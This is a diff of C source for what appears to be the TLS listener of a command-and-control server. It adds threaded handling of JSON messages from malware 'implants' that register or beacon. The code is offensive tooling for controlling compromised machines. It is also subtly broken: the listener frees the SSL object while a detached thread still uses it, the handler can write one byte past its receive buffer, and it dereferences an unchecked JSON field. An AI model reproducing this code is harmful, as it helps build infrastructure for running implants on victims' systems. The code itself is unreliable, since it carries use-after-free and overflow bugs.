@@ -1,4 +1,5 @@
 #include "tcp_ssl.h"
+
 #include <openssl/evp.h>
 #include <openssl/x509v3.h>
 #include <openssl/rsa.h>
@@ -11,6 +12,7 @@
 #include <openssl/sslerr.h>
 
 #include <stdio.h>
+#include <cjson/cJSON.h>
 #include <stdlib.h>
 #include <stdbool.h>
 #include <string.h>
@@ -19,8 +21,20 @@
 #include <unistd.h>
 #include <netinet/in.h>
 #include <time.h>
+#include <pthread.h>
+
+struct tcp_ssl_thread_args {
+    SSL *ssl;
+    char ip[256];
+};
+
+
+#define BUFFER_SIZE 4096
+#define MAX_RESPONSE 0x20000
+
 
 //void generate_key_and_cert();
+
 
 void init() {
     SSL_load_error_strings();
@@ -100,6 +114,19 @@ void* tcp_ssl_listener(void *port) {
 
         // create thread to call tcp_enc_agent_handler and pass the following as arguments
         // sock, ssl, ip (create heap chunk)
+        pthread_t thread;
+        struct tcp_ssl_thread_args *args = malloc(sizeof(struct tcp_ssl_thread_args));
+        args->ssl = ssl;
+        strcpy(args->ip, inet_ntoa(client_addr.sin_addr));
+
+        if (pthread_create(&thread, NULL, tcp_ssl_agent_handler, (void*)args) < 0) {
+            perror("could not create thread");
+            free(args);
+            continue;
+        }
+        // Detach thread so resources are automatically freed on exit
+        pthread_detach(thread);
+
 
         SSL_free(ssl);
         close(agentSock);
@@ -107,6 +134,45 @@ void* tcp_ssl_listener(void *port) {
     CLEANUP:
     close(serverSock);
 }
+
+
+void *tcp_ssl_agent_handler(void *args) {
+    struct tcp_ssl_thread_args *arg = (struct tcp_ssl_thread_args*)args;
+    SSL *ssl  = arg->ssl;
+
+
+    // recieves message from implant register or beaconing
+    char buffer[BUFFER_SIZE];
+    //int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
+    int bytes_received = SSL_read(ssl, buffer, sizeof(buffer));
+    if (bytes_received <= 0) {
+        perror("recv failed");
+        return NULL;
+    }
+    buffer[bytes_received] = '\0';
+
+    cJSON *json = cJSON_Parse(buffer);
+    if (!json) {
+        printf("Error parsing JSON!\n");
+        return NULL;
+    }
+
+    cJSON *type = cJSON_GetObjectItem(json, "mode");
+    if (strcmp(type->valuestring, "register") == 0) {
+        register_agent(json, arg->ip, ssl);
+    } else if (strcmp(type->valuestring, "beacon") == 0) {
+        beacon(json, ssl);
+    } else if (strcmp(type->valuestring, "session") == 0) {
+        // session mode
+        // session();
+    }
+
+    //cJSON_Delete(json);
+    SSL_free(ssl);
+    free(args);
+    return NULL;
+}
+
 
 
 
